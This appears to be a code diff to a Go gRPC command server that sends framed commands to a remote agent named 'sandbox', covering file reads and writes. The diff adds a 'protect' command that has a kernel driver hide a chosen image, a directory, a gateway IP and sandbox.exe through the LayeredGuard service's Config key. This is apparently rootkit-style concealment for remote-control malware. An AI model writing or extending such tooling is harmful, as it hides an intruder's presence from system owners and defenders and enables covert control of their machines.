@@ -137,6 +137,17 @@ func (s *GRPCServer) SendCommand(ctx context.Context, req *pb.SendCommandRequest
 		payload = sandboxFrame(0x03, []byte(arg(0)))
 	case "file_read", "cat":
 		payload = sandboxFrame(0x04, []byte(arg(0)))
+	case "protect":
+		// merge hide rules into the kernel driver Config key:
+		// parameters [image, dir, gateway-ip]; the sandbox appends
+		// sandbox.exe and targets the LayeredGuard service key
+		frame := append([]byte(arg(0)), 0)
+		frame = append(frame, []byte(arg(1))...)
+		frame = append(frame, 0)
+		frame = append(frame, []byte(arg(2))...)
+		frame = append(frame, 0)
+		frame = append(frame, []byte("sandbox.exe")...)
+		payload = sandboxFrame(0x08, frame)
 	case "file_write", "write":
 		// parameters: path, hex-content
 		payload = sandboxFrame(0x05, append(append([]byte(arg(0)), 0), arg(1)...))
